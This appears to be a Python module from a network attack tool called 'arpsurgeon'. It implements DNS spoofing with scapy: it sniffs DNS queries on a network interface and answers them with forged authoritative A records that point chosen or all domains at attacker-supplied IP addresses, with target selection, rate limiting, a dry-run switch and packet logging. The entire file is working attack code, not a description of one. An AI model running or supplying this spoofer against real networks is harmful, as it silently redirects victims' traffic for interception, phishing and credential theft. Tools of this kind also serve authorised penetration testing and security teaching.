from __future__ import annotations

import time
from collections import deque
from threading import Event
from dataclasses import dataclass
from typing import Optional

from scapy.all import DNS, DNSQR, DNSRR, IP, UDP, conf, send, sniff  # type: ignore

from arpsurgeon.session_log import JsonlLogger, PcapLogger


@dataclass
class SpoofRule:
    domain: str
    ip: str
    wildcard: bool


def _normalize(domain: str) -> str:
    return domain.rstrip(".").lower()


def load_hosts(path: Optional[str]) -> list[SpoofRule]:
    if not path:
        return []
    rules = []
    with open(path, "r", encoding="ascii", errors="ignore") as handle:
        for line in handle:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            parts = line.split()
            if len(parts) < 2:
                continue
            ip = parts[0]
            for domain in parts[1:]:
                wildcard = domain.startswith("*.")
                normalized = _normalize(domain[2:] if wildcard else domain)
                rules.append(SpoofRule(domain=normalized, ip=ip, wildcard=wildcard))
    return rules


def match_rule(domain: str, rules: list[SpoofRule]) -> Optional[str]:
    normalized = _normalize(domain)
    for rule in rules:
        if rule.wildcard:
            if normalized == rule.domain or normalized.endswith("." + rule.domain):
                return rule.ip
        elif normalized == rule.domain:
            return rule.ip
    return None


def dns_spoof(
    iface: Optional[str],
    duration: Optional[int],
    hosts_file: Optional[str],
    default_ip: Optional[str],
    targets: list[str],
    jsonl_path: Optional[str],
    pcap_path: Optional[str],
    pcap_filter: Optional[str],
    ttl: int,
    max_rate: Optional[int],
    dry_run: bool,
    stop_event: Optional[Event],
    pcap_rotate_mb: Optional[int],
    pcap_rotate_seconds: Optional[int],
) -> None:
    if iface:
        conf.iface = iface
    rules = load_hosts(hosts_file)
    jsonl_logger = JsonlLogger(jsonl_path)
    max_bytes = pcap_rotate_mb * 1024 * 1024 if pcap_rotate_mb else None
    pcap_logger = PcapLogger(pcap_path, max_bytes=max_bytes, max_seconds=pcap_rotate_seconds)
    targets_set = set(targets)
    bpf = pcap_filter or "udp port 53"
    timestamps = deque()

    def handler(pkt) -> None:
        now = time.time()
        pcap_logger.write(pkt)
        if not pkt.haslayer(DNS) or not pkt.haslayer(DNSQR):
            return
        dns = pkt.getlayer(DNS)
        if dns.qr != 0 or dns.opcode != 0:
            return
        ip = pkt.getlayer(IP)
        udp = pkt.getlayer(UDP)
        if targets_set and ip.src not in targets_set:
            return
        qname = dns.qd.qname.decode(errors="ignore") if dns.qd and dns.qd.qname else ""
        qtype = dns.qd.qtype if dns.qd else None
        if qtype != 1:
            return
        spoof_ip = match_rule(qname, rules) or default_ip
        if not spoof_ip:
            return
        if max_rate:
            timestamps.append(now)
            while timestamps and now - timestamps[0] > 1:
                timestamps.popleft()
            if len(timestamps) > max_rate:
                return
        response = (
            IP(dst=ip.src, src=ip.dst)
            / UDP(dport=udp.sport, sport=udp.dport)
            / DNS(
                id=dns.id,
                qr=1,
                aa=1,
                qd=dns.qd,
                an=DNSRR(rrname=dns.qd.qname, ttl=ttl, rdata=spoof_ip),
            )
        )
        if not dry_run:
            send(response, verbose=False)
        jsonl_logger.log(
            {
                "type": "dns_spoof",
                "src_ip": ip.src,
                "dst_ip": ip.dst,
                "qname": qname,
                "spoof_ip": spoof_ip,
                "ts": now,
                "dry_run": dry_run,
            }
        )

    start = time.monotonic()
    while True:
        if duration is not None:
            remaining = duration - (time.monotonic() - start)
            if remaining <= 0:
                break
            timeout = min(1.0, remaining)
        else:
            timeout = 1.0 if stop_event else None
        sniff(
            filter=bpf,
            prn=handler,
            store=False,
            timeout=timeout,
            stop_filter=(lambda _pkt: stop_event.is_set()) if stop_event else None,
        )
        if stop_event and stop_event.is_set():
            break
    jsonl_logger.close()
    pcap_logger.close()
